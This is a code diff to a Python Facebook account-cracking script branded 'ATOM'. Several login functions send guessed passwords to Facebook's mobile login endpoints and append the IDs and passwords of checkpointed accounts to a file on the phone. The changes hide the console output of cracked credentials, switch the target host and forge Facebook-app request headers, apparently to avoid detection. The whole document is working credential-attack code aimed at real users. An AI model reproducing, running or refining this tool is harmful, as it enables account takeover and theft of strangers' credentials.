@@ -1321,7 +1321,7 @@ def mbasic(uid,pwx,tl):
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki[0:11]
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -1418,7 +1418,7 @@ def p(uid,pwx,tl):
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki[0:11]
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -1498,7 +1498,7 @@ def x(uid,pwx,tl):
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki[0:11]
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -1591,7 +1591,7 @@ def mobile(uid,pwx,tl):
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki[0:11]
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -1628,29 +1628,24 @@ def freeq(uid,pwx,tl):
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'login': 'Masuk'}
             headers = {
-            "Host": "p.facebook.com",
+            "Host": "m.facebook.com",
             "Connection": "keep-alive",
-            "dpr": "2.4749999046325684",
-            "viewport-width": "980",
-            "sec-ch-ua": '"Chromium";v="130", "Android WebView";v="130", "Not?A_Brand";v="99"',
+            "Cache-Control": "max-age=0",
+            "sec-ch-ua": '"Chromium";v="119", "Not?A_Brand";v="24"',
             "sec-ch-ua-mobile": "?1",
             "sec-ch-ua-platform": '"Android"',
-            "sec-ch-ua-platform-version": "",
-            "sec-ch-ua-model": "",
-            "sec-ch-ua-full-version-list": "",
-            "sec-ch-prefers-color-scheme": "light",
             "Upgrade-Insecure-Requests": "1",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; V2060 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Soul/4.0 Chrome/130.0.6723.17 Mobile Safari/537.36",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 Pro MIUI/V12.5.1.0.QFHINXM) [FBAN/EMA;FBBV/645271943;FBAV/426.0.0.5.108;FBDV/Redmi Note 7 Pro;FBSV/10;FBCX/OkHttp3;FBDM/{density=2.75}]",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "X-Requested-With": "com.mycompany.app.soulbrowser",
-            "Sec-Fetch-Site": "none",
+            "Sec-Fetch-Site": "cross-site",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-User": "?1",
             "Sec-Fetch-Dest": "document",
+            "Referer": "https://m.facebook.com/login/save-device/",
             "Accept-Encoding": "gzip, deflate, br, zstd",
             "Accept-Language": "en-US,en;q=0.9",}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1678,7 +1673,7 @@ def freeq(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -1780,7 +1775,7 @@ def d(uid,pwx,tl):
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki[0:11]
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
